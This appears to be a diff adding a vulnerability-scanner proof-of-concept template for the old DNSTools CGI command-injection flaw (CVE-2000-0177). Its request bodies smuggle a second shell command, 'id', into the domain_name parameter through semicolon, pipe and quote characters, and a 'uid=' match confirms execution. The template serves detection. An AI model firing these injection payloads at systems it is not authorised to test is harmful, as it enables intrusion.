@@ -1,0 +1,59 @@
+[info]
+author = "ave"
+description = "检测 DNSTools 1.0.8/1.10 CGI 脚本的输入验证漏洞。CGI 脚本未对 host_name 和 domain_name 参数进行过滤即传入 system() 调用，通过注入分号/管道符等 shell 元字符可执行任意系统命令。"
+id = "POC-AVE-2000-0600"
+name = "DNSTools CGI 远程命令执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2000-0600"]
+vuln_id = [
+    "CVE-2000-0177",
+    "AVE-2000-0600",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/dnstools.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "domain_name=test.com%3Bid&host_name=127.0.0.1"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/dnsadmin.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "domain_name=test.com%7Cid&host_name=127.0.0.1"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/test.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "domain_name=%22%3Bid&host_name=127.0.0.1"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
